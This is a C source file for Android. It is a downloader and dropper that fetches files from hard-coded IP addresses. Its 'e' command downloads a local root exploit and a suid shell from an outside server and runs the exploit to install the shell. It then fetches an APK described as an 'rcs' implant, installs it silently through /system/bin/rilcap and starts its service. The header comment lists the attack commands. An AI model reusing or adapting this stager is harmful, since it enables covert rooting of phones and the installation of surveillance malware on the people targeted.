/*
    $NDK/ndk-build && adb push ../libs/armeabi/download /data/local/tmp/d
    /data/local/tmp/d d 192.168.1.8 80 /data/local/tmp/memo.txt
    /data/local/tmp/d w 93.62.139.41 /data/local/tmp/galileo.png /images/stories/galileo.png
    /data/local/tmp/d w 74.207.224.54 /data/local/tmp/inst.apk /inst/inst.v2.apk

    /data/local/tmp/d w 192.168.1.8 /exploit/local_exploit /data/local/tmp/local
    /data/local/tmp/d e 192.168.1.8 /data/local/tmp/
*/
/*  Make the necessary includes and set up the variables.  */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h> 
#include <netinet/ip.h> 
#include <stdio.h>
#include <sys/un.h>
#include <unistd.h>
#include <stdlib.h>
#include <netdb.h>

#define BUFSIZE 1024

int download(char* ip, int server_port, char* localfile, char* send_data, char* strip_answer){
    int sockfd;
    int len;
    struct hostent *hp;  
    int result;
    /*  Create a socket for the client.  */

    sockfd = socket(PF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
      perror("Could not open socket\n");
      exit(1);
    }
    /*  Name the socket, as agreed with the server.  */

    struct sockaddr_in server;
    bzero((char *) &server, sizeof(server));
    //memset((char *)&server_tcp_addr, 0, sizeof(server_tcp_addr));
    
    server.sin_family = AF_INET;
    server.sin_port = htons(server_port);
    inet_aton(ip, &(server.sin_addr.s_addr));

    socklen_t slen = sizeof(server);

/*  Now connect our socket to the server's socket.  */
    printf("connecting to: %s:%d\n", ip, server_port);
    result = connect(sockfd, (struct sockaddr *)&server, slen);

    if(result == -1) {
        perror("Cannot connect\n");
        return(1);
    }

    FILE* file = fopen(localfile, "w+");
    if (file == NULL)
    {
        printf("cannot open file: %s\n", localfile);
        return(1);
    }

    if(send_data != NULL){
        printf("Sending data: %s",  send_data);
        write(sockfd, send_data, strlen(send_data));
    }

    int first = strip_answer!=NULL;

/*  We can now read/write via sockfd.  */
    char buf[BUFSIZE];
    int nread, total;
    char* ptr;
    char* pos;
    for(;;) {
        nread = read(sockfd, buf, BUFSIZE);
        printf("read: %d\n", nread);
        total+=nread;
        ptr = buf;

        if (nread < 0) {
                perror("read\n");
                return(1);
        }

        if (nread == 0) {
                printf("socket closed\n");
                break;
        }

        if(first){
            if( pos = strstr(buf, strip_answer) ){
                
                ptr = pos + strlen(strip_answer);
                printf("found occurrence at pos: %d\n", (ptr - buf) );
                nread -= (ptr - buf);
                first = 0;
            }else{
                continue;
            }
            
        }

        fwrite(ptr, 1, nread, file);
        fflush(file);
   } 
    
    fclose(file);

    printf("total from server = %d\n", nread);
    close(sockfd);

    chmod(localfile, 0777);
    
    return(0);
}

int main(int argc, char* argv[])
{
    if(argc<4){
        printf("Usage: %s [command] <args...>\n", argv[0]);
        printf("   command d: ip port localfile | gets the data from the ip, at the specified port, and saves it to the [localfile]\n");
        printf("   command w: ip path localfile | gets http://[ip]/[path] and saves it to the [localfile] \n");
        printf("   command e: ip localdir | exploits and install the rcs apk \n");
        exit(1);
    }

    int ret=-1;
    if(strcmp(argv[1], "d")==0){
        char* ip = argv[2];
        int port = atoi(argv[3]);
        char* localfile = argv[4];
        ret = download(ip, port, localfile, NULL, NULL);

    }else if(strcmp(argv[1], "w")==0){
        char* ip = argv[2];
        char* path = argv[3];
        char* localfile = argv[4];
        char command_get[1024];
        sprintf(command_get, "GET %s HTTP/1.1\n\n", path);
        ret = download(ip, 80, localfile, command_get, "\r\n\r\n");

    }else if(strcmp(argv[1], "e")==0){
        // gets the local exploit and the shell.
        // runs the local in order to install the shell
        // if it works, it downloads and install the apk
        char buf_command[160];
        char buf_localfile[128];
        char* ip = argv[2];
        char* localdir = argv[3];

        // get the local
        sprintf(buf_command, "GET /exploit/local_exploit HTTP/1.1\n\n");
        sprintf(buf_localfile, "%s/local", localdir);
        ret = download(ip, 80, buf_localfile, buf_command, "\r\n\r\n");

        if(ret == 1){
            printf("error local download");
            exit(1);
        }
        chmod(buf_localfile, 0777);

        // gets the shell
        sprintf(buf_command, "GET /exploit/suidext HTTP/1.1\n\n");
        sprintf(buf_localfile, "%s/shell", localdir);
        ret = download(ip, 80, buf_localfile, buf_command, "\r\n\r\n");

        if(ret == 1){
            printf("error shell download");
            exit(1);
        }
        chmod(buf_localfile, 0777);

        // install the shell
        sprintf(buf_command, "%s/local %s/shell rt", localdir, localdir);
        system(buf_command);

        // gets the apk
        sprintf(buf_command, "GET /exploit/inst.v2.apk HTTP/1.1\n\n");
        sprintf(buf_localfile, "%s/inst.apk", localdir);
        ret = download(ip, 80, buf_localfile, buf_command, "\r\n\r\n");

        if(ret == 1){
            printf("error apk download");
            exit(1);
        }

        // install the apk
        sprintf(buf_command, "/system/bin/rilcap qzx \"export LD_LIBRARY_PATH=/vendor/lib:/system/lib\n pm install %s/inst.apk\"", localdir);
        system(buf_command);
        sprintf(buf_command, "/system/bin/rilcap qzx \"export LD_LIBRARY_PATH=/vendor/lib:/system/lib\nam startservice com.android.deviceinfo/.ServiceMain\"");
        system(buf_command);

    }else{
        printf("Error: command unknown: %s\n", argv[1]);
        ret = 1;
    }

    exit(ret);
}